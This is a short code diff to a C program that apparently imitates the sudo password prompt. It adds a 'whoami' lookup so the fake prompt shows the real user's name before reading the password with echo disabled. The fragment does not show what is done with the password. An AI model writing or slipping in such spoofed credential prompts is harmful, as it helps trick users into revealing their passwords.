@@ -96,8 +96,10 @@ int main() {
     char password[MAX_PASSWORD_LENGTH];
     int i = 0;
     char c;
-
-    printf("[sudo] password for user: ");
+	char username[MAX_BUFFER_SIZE] = "";
+	executeCommand("whoami", username);
+	removeCharacter(username, '\n');
+    printf("[sudo] password for %s: ", username);
     fflush(stdout);
     disable_echo();
 
